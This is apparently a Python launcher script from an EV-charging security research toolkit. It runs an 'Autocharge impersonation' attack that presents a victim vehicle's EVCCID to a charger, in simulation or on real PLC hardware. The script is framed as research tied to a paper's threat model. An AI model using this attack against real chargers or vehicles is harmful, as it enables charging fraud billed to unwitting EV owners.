"""CLI entry — runs HotWire as a PEV that impersonates a given EVCCID.

Typical use::

    # In a controlled test against your own EV or a willing pilot site.
    python scripts/attacks/autocharge_impersonation.py --evccid D83ADD22F182

    # Run headless (no GUI) — log all wire-level activity to a JSONL:
    python scripts/attacks/autocharge_impersonation.py --evccid D83ADD22F182 --headless

See :class:`hotwire.attacks.AutochargeImpersonation` for the attack
itself and paper §4 Attack 1 for the threat model.
"""
from __future__ import annotations

import argparse
import os
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

from hotwire.attacks import AutochargeImpersonation  # noqa: E402
from hotwire.core.config import load as load_config  # noqa: E402


def _run_headless(attack: AutochargeImpersonation, is_sim: bool) -> int:
    from hotwire.core.worker import HotWireWorker
    from hotwire.fsm.pause_controller import PauseController

    pc = PauseController()
    attack.apply(pc)

    start_ms = int(time.time() * 1000)

    def trace(s: str) -> None:
        dt = int(time.time() * 1000) - start_ms
        print(f"[{dt}ms] {s}", flush=True)

    def show_status(s: str, selection: str = "") -> None:
        if selection:
            print(f"[STATUS/{selection}] {s}", flush=True)

    worker = HotWireWorker(
        callbackAddToTrace=trace,
        callbackShowStatus=show_status,
        mode=attack.mode,
        isSimulationMode=1 if is_sim else 0,
        pause_controller=pc,
    )
    try:
        while True:
            time.sleep(0.03)
            worker.mainfunction()
    except KeyboardInterrupt:
        print("\n[attack] interrupted")
        return 0


def _run_gui(attack: AutochargeImpersonation, is_sim: bool) -> int:
    from hotwire.gui.app import run_gui

    return run_gui(mode=attack.mode, is_simulation=is_sim, attack=attack)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="HotWire Attack A1 — Autocharge impersonation"
    )
    parser.add_argument(
        "--evccid",
        required=True,
        help="Victim's 12-hex-character EVCCID (e.g. D83ADD22F182).",
    )
    parser.add_argument(
        "--headless",
        action="store_true",
        help="Run without the PyQt6 GUI — useful for fleet testing / logging.",
    )
    parser.add_argument(
        "--hw", action="store_true",
        help="Use real PLC hardware (default: pure-software simulation).",
    )
    parser.add_argument("--config", help="Override HOTWIRE_CONFIG path.")
    args = parser.parse_args()

    if args.config:
        os.environ["HOTWIRE_CONFIG"] = args.config
    elif "HOTWIRE_CONFIG" not in os.environ:
        os.environ["HOTWIRE_CONFIG"] = str(
            Path(__file__).resolve().parent.parent.parent
            / "config" / "hotwire.ini"
        )
    load_config()

    attack = AutochargeImpersonation(evccid=args.evccid)
    print(attack.describe())
    is_sim = not args.hw
    return _run_headless(attack, is_sim) if args.headless else _run_gui(attack, is_sim)


if __name__ == "__main__":
    sys.exit(main())
